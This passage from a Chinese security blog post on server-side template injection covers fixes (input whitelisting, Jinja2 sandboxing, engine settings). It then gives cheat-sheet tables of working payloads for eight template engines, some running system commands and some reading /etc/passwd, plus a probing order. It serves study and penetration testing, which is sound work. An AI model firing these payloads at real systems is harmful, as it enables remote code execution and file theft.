+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 白名单验证</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9_]+$&#x27;</span>, user_input):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Invalid input&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 黑名单过滤（不推荐，容易绕过）</span></span><br><span class="line">blacklist = [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> blacklist:</span><br><span class="line">    user_input = user_input.replace(char, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法 3：使用沙箱环境</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Jinja2 沙箱</span></span><br><span class="line"><span class="keyword">from</span> jinja2.sandbox <span class="keyword">import</span> SandboxedEnvironment</span><br><span class="line">env = SandboxedEnvironment()</span><br><span class="line">template = env.from_string(<span class="string">&quot;Hello, &#123;&#123; name &#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法 4：禁用危险功能</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Smarty - 禁用 PHP 标签</span></span><br><span class="line"><span class="variable">$smarty</span>-&gt;php_handling = <span class="title class_">Smarty</span>::<span class="variable constant_">PHP_REMOVE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Twig - 禁用危险过滤器</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>, [</span><br><span class="line">    <span class="string">&#x27;autoescape&#x27;</span> =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-3-安全编码建议"><a href="#9-3-安全编码建议" class="headerlink" title="9.3 安全编码建议"></a>9.3 安全编码建议</h3><ol>
+<li><strong>永远不要将用户输入直接拼接到模板中</strong></li>
+<li><strong>使用模板引擎提供的变量传递机制</strong></li>
+<li><strong>对用户输入进行严格的白名单验证</strong></li>
+<li><strong>使用沙箱环境限制模板功能</strong></li>
+<li><strong>定期更新模板引擎版本</strong></li>
+<li><strong>进行安全代码审计</strong></li>
+</ol>
+<hr>
+<h2 id="十、速查表"><a href="#十、速查表" class="headerlink" title="十、速查表"></a>十、速查表</h2><h3 id="10-1-模板引擎语法速查"><a href="#10-1-模板引擎语法速查" class="headerlink" title="10.1 模板引擎语法速查"></a>10.1 模板引擎语法速查</h3><table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>变量输出</th>
+<th>表达式</th>
+<th>注释</th>
+<th>条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jinja2</td>
+<td><code>&#123;&#123;var&#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td>&#96;&#96;</td>
+<td><code>&#123;% if %&#125;</code></td>
+</tr>
+<tr>
+<td>Twig</td>
+<td><code>&#123;&#123;var&#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td>&#96;&#96;</td>
+<td><code>&#123;% if %&#125;</code></td>
+</tr>
+<tr>
+<td>Smarty</td>
+<td><code>&#123;$var&#125;</code></td>
+<td><code>&#123;$var|func&#125;</code></td>
+<td><code>&#123;* *&#125;</code></td>
+<td><code>&#123;if&#125;</code></td>
+</tr>
+<tr>
+<td>ThinkPHP</td>
+<td><code>&#123;$var&#125;</code></td>
+<td><code>&#123;$var|func&#125;</code></td>
+<td><code>&#123;/* */&#125;</code></td>
+<td><code>&#123;if&#125;</code></td>
+</tr>
+<tr>
+<td>FreeMarker</td>
+<td><code>$&#123;var&#125;</code></td>
+<td><code>$&#123;7*7&#125;</code></td>
+<td><code>&lt;#-- --&gt;</code></td>
+<td><code>&lt;#if&gt;</code></td>
+</tr>
+<tr>
+<td>Velocity</td>
+<td><code>$var</code></td>
+<td><code>#set($x=7*7)</code></td>
+<td><code>## </code></td>
+<td><code>#if</code></td>
+</tr>
+<tr>
+<td>ERB</td>
+<td><code>&lt;%= var %&gt;</code></td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td><code>&lt;%# %&gt;</code></td>
+<td><code>&lt;% if %&gt;</code></td>
+</tr>
+<tr>
+<td>EJS</td>
+<td><code>&lt;%= var %&gt;</code></td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td><code>&lt;%# %&gt;</code></td>
+<td><code>&lt;% if %&gt;</code></td>
+</tr>
+<tr>
+<td>Blade</td>
+<td><code>&#123;&#123;var&#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td><code>&#123;&#123;-- --&#125;&#125;</code></td>
+<td><code>@if</code></td>
+</tr>
+</tbody></table>
+<h3 id="10-2-RCE-Payload-速查"><a href="#10-2-RCE-Payload-速查" class="headerlink" title="10.2 RCE Payload 速查"></a>10.2 RCE Payload 速查</h3><table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>RCE Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jinja2</td>
+<td><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('id').read()&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Twig</td>
+<td><code>&#123;&#123;['id']\|filter('system')&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Smarty</td>
+<td><code>&#123;if system(&#39;id&#39;)&#125;&#123;/if&#125;</code></td>
+</tr>
+<tr>
+<td>ThinkPHP</td>
+<td><code>&#123;$_GET.func|array_map=$_GET.cmd|implode&#125;&amp;func=passthru&amp;cmd[]=id</code></td>
+</tr>
+<tr>
+<td>FreeMarker</td>
+<td><code>$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</code></td>
+</tr>
+<tr>
+<td>Velocity</td>
+<td><code>#set($rt=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime())$rt.exec(&quot;id&quot;)</code></td>
+</tr>
+<tr>
+<td>ERB</td>
+<td><code>&lt;%= system(&#39;id&#39;) %&gt;</code></td>
+</tr>
+<tr>
+<td>EJS</td>
+<td><code>&lt;%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;) %&gt;</code></td>
+</tr>
+</tbody></table>
+<h3 id="10-3-文件读取-Payload-速查"><a href="#10-3-文件读取-Payload-速查" class="headerlink" title="10.3 文件读取 Payload 速查"></a>10.3 文件读取 Payload 速查</h3><table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>文件读取 Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jinja2</td>
+<td><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Twig</td>
+<td><code>&#123;&#123;'/etc/passwd'\|file_excerpt(1,-1)&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>ThinkPHP</td>
+<td><code>&#123;$_GET.f|@file|@implode&#125;&amp;f=/etc/passwd</code></td>
+</tr>
+<tr>
+<td>FreeMarker</td>
+<td><code>$&#123;.data_model.class.protectionDomain.codeSource.location&#125;</code></td>
+</tr>
+<tr>
+<td>ERB</td>
+<td><code>&lt;%= File.read(&#39;/etc/passwd&#39;) %&gt;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十一、总结"><a href="#十一、总结" class="headerlink" title="十一、总结"></a>十一、总结</h2><h3 id="11-1-为什么你的-没有反应？"><a href="#11-1-为什么你的-没有反应？" class="headerlink" title="11.1 为什么你的  没有反应？"></a>11.1 为什么你的 49 没有反应？</h3><ol>
+<li><strong>ThinkPHP 使用的是 <code>&#123;$var&#125;</code> 语法，不是 <code>&#123;&#123;var&#125;&#125;</code></strong></li>
+<li><strong>不同模板引擎有完全不同的语法</strong></li>
+<li><strong>必须根据目标环境选择正确的测试 Payload</strong></li>
+</ol>
+<h3 id="11-2-如何全面测试-SSTI？"><a href="#11-2-如何全面测试-SSTI？" class="headerlink" title="11.2 如何全面测试 SSTI？"></a>11.2 如何全面测试 SSTI？</h3><ol>
+<li><strong>先收集信息</strong>：识别后端语言和框架</li>
+<li><strong>多种语法测试</strong>：不要只用一种 Payload</li>
+<li><strong>观察响应</strong>：计算结果、错误信息、原样输出</li>
+<li><strong>确认引擎</strong>：使用特定引擎的 Payload 确认</li>
+<li><strong>尝试利用</strong>：信息泄露 → 文件读取 → RCE</li>
+</ol>
+<h3 id="11-3-记住这个测试顺序"><a href="#11-3-记住这个测试顺序" class="headerlink" title="11.3 记住这个测试顺序"></a>11.3 记住这个测试顺序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;  →  &#123;&#123;7*7&#125;&#125;  →  &#123;$var&#125;  →  #&#123;7*7&#125;  →  &lt;%= 7*7 %&gt;</span><br><span class="line">   ↓          ↓          ↓          ↓           ↓</span><br><span class="line"> Java      Python      PHP       Java        Ruby</span><br><span class="line">FreeMarker  Jinja2    Smarty   Thymeleaf     ERB</span><br><span class="line">  Mako      Twig    ThinkPHP    SpEL        EJS</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger - Server-Side Template Injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks - SSTI</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings - SSTI</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">Tplmap - SSTI 自动化工具</a></li>
+<li><a target="_blank" rel="noopener" href="https://doc.thinkphp.cn/">ThinkPHP 官方文档 - 模板引擎</a></li>
+</ul>
+<hr>
+<p><em>笔记作者：Fan</em><br><em>最后更新：2025-12-21</em><br><em>声明：本文章仅提供于网安交流学习，请勿用于非法途径，读者的一切行为与作者无关</em></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Lyifan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/">http://example.com/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Fan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/%E5%A4%B4%E5%83%8F.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/22/Renderme-wp/" title="Renderme_wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Renderme_wp</div></div><div class="info-2"><div class="info-item-1">RenderMe -ThinkPHP 8 SSTI 到 RCE 再 Privilege Escalation题目信息 题目名称: RenderMe 题目描述: “I wrote a simple page to render your name.” 难度: 中等偏难 考点: SSTI (服务端模板注入) → RCE (远程代码执行) → 权限提升   Part 1: SSTI 漏洞分析与利用一、什么是 SSTI 漏洞？1.1 SSTI 概念SSTI (Server-Side Template Injection，服务端模板注入) 是一种注入漏洞，发生在用户输入被不安全地嵌入到服务端模板中时。 现代 Web 应用通常使用模板引擎来动态生成 HTML 页面。模板引擎允许开发者在 HTML 中嵌入特殊语法，这些语法会在服务端被解析执行。 正常的模板使用方式： 123// 安全：变量通过参数传递，会被自动转义$template = &quot;Hello, &#123;$name&#125;&quot;;View::display($template, [&#x27;name&#x27;...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lyifan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Lyi-Fan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">博客建设中，欢迎提出宝贵意见！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-Fuzz%E5%AE%8C%E5%85%A8%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97"><span class="toc-number">1.</span> <span class="toc-text">SSTI Fuzz完全测试指南</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88-%E6%B2%A1%E6%9C%89%E5%8F%8D%E5%BA%94%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">一、为什么 49 没有反应？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 问题解答</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-ThinkPHP-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%AE%A4-%EF%BC%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2 ThinkPHP 为什么不认 49？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%95%99%E8%AE%AD"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.3 教训</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SSTI-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.3.</span> <span class="toc-text">二、SSTI 基础概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%BB%80%E4%B9%88%E6%98%AF-SSTI%EF%BC%9F"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 什么是 SSTI？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-SSTI-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 SSTI 的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%86%E5%88%AB%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">三、模板引擎识别方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%AF%86%E5%88%AB%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1 识别流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%BF%AB%E9%80%9F%E8%AF%86%E5%88%AB%E8%A1%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2 快速识别表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E8%AF%86%E5%88%AB"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3 通过错误信息识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E9%80%9A%E8%BF%87%E5%93%8D%E5%BA%94%E5%A4%B4-%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4 通过响应头&#x2F;框架识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%90%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%A6%E7%BB%86%E6%B5%8B%E8%AF%95-Payload"><span class="toc-number">1.5.</span> <span class="toc-text">四、各模板引擎详细测试 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-Python-Jinja2-Flask"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1 Python - Jinja2 (Flask)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Python-Django-Templates"><span class="toc-number">1.5.2.</span> <span class="toc-text">4.2 Python - Django Templates</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Python-Mako"><span class="toc-number">1.5.3.</span> <span class="toc-text">4.3 Python - Mako</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-Python-Tornado"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.4 Python - Tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-PHP-Twig"><span class="toc-number">1.5.5.</span> <span class="toc-text">4.5 PHP - Twig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-PHP-Smarty"><span class="toc-number">1.5.6.</span> <span class="toc-text">4.6 PHP - Smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-PHP-ThinkPHP-ThinkTemplate"><span class="toc-number">1.5.7.</span> <span class="toc-text">4.7 PHP - ThinkPHP (ThinkTemplate)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-PHP-Blade-Laravel"><span class="toc-number">1.5.8.</span> <span class="toc-text">4.8 PHP - Blade (Laravel)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-9-Java-FreeMarker"><span class="toc-number">1.5.9.</span> <span class="toc-text">4.9 Java - FreeMarker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-10-Java-Velocity"><span class="toc-number">1.5.10.</span> <span class="toc-text">4.10 Java - Velocity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-11-Java-Thymeleaf"><span class="toc-number">1.5.11.</span> <span class="toc-text">4.11 Java - Thymeleaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-Java-Spring-SpEL"><span class="toc-number">1.5.12.</span> <span class="toc-text">4.12 Java - Spring (SpEL)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-13-Ruby-ERB"><span class="toc-number">1.5.13.</span> <span class="toc-text">4.13 Ruby - ERB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-14-Node-js-EJS"><span class="toc-number">1.5.14.</span> <span class="toc-text">4.14 Node.js - EJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-15-Node-js-Pug-Jade"><span class="toc-number">1.5.15.</span> <span class="toc-text">4.15 Node.js - Pug (Jade)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-16-Node-js-Handlebars"><span class="toc-number">1.5.16.</span> <span class="toc-text">4.16 Node.js - Handlebars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-17-Go-html-template"><span class="toc-number">1.5.17.</span> <span class="toc-text">4.17 Go - html&#x2F;template</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81SSTI-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.6.</span> <span class="toc-text">五、SSTI 测试流程图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E5%AE%8C%E6%95%B4%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.1.</span> <span class="toc-text">5.1 完整测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%86%E5%88%AB%E5%86%B3%E7%AD%96%E6%A0%91"><span class="toc-number">1.6.2.</span> <span class="toc-text">5.2 模板引擎识别决策树</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E9%80%9A%E7%94%A8-SSTI-%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95"><span class="toc-number">1.7.</span> <span class="toc-text">六、通用 SSTI 测试清单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E5%BF%85%E6%B5%8B-Payload-%E6%B8%85%E5%8D%95"><span class="toc-number">1.7.1.</span> <span class="toc-text">6.1 必测 Payload 清单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%AE%8C%E6%95%B4%E6%B5%8B%E8%AF%95-Payload-%E5%88%97%E8%A1%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">6.2 完整测试 Payload 列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%B5%8B%E8%AF%95%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.7.3.</span> <span class="toc-text">6.3 测试注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.8.</span> <span class="toc-text">七、实战案例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E6%A1%88%E4%BE%8B%EF%BC%9ARenderMe-ThinkPHP-8"><span class="toc-number">1.8.1.</span> <span class="toc-text">7.1 案例：RenderMe (ThinkPHP 8)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E6%A1%88%E4%BE%8B%EF%BC%9AFlask-SSTI"><span class="toc-number">1.8.2.</span> <span class="toc-text">7.2 案例：Flask SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E6%A1%88%E4%BE%8B%EF%BC%9ATwig-SSTI"><span class="toc-number">1.8.3.</span> <span class="toc-text">7.3 案例：Twig SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E6%A1%88%E4%BE%8B%EF%BC%9AFreeMarker-SSTI"><span class="toc-number">1.8.4.</span> <span class="toc-text">7.4 案例：FreeMarker SSTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="toc-number">1.9.</span> <span class="toc-text">八、自动化测试脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-Python-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"><span class="toc-number">1.9.1.</span> <span class="toc-text">8.1 Python 自动化测试脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.9.2.</span> <span class="toc-text">8.2 使用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-Burp-Suite-%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.9.3.</span> <span class="toc-text">8.3 Burp Suite 测试方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.10.</span> <span class="toc-text">九、防御与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.1.</span> <span class="toc-text">9.1 漏洞成因总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.2.</span> <span class="toc-text">9.2 修复方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.10.3.</span> <span class="toc-text">9.3 安全编码建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.11.</span> <span class="toc-text">十、速查表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10-1-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5"><span class="toc-number">1.11.1.</span> <span class="toc-text">10.1 模板引擎语法速查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-2-RCE-Payload-%E9%80%9F%E6%9F%A5"><span class="toc-number">1.11.2.</span> <span class="toc-text">10.2 RCE Payload 速查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-3-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Payload-%E9%80%9F%E6%9F%A5"><span class="toc-number">1.11.3.</span> <span class="toc-text">10.3 文件读取 Payload 速查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.12.</span> <span class="toc-text">十一、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-1-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84-%E6%B2%A1%E6%9C%89%E5%8F%8D%E5%BA%94%EF%BC%9F"><span class="toc-number">1.12.1.</span> <span class="toc-text">11.1 为什么你的 49 没有反应？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2-%E5%A6%82%E4%BD%95%E5%85%A8%E9%9D%A2%E6%B5%8B%E8%AF%95-SSTI%EF%BC%9F"><span class="toc-number">1.12.2.</span> <span class="toc-text">11.2 如何全面测试 SSTI？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-3-%E8%AE%B0%E4%BD%8F%E8%BF%99%E4%B8%AA%E6%B5%8B%E8%AF%95%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.12.3.</span> <span class="toc-text">11.3 记住这个测试顺序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.13.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/" title="SSTI的全面fuzz">SSTI的全面fuzz</a><time datetime="2025-12-23T07:11:21.000Z" title="发表于 2025-12-23 15:11:21">2025-12-23</time></div></div><div 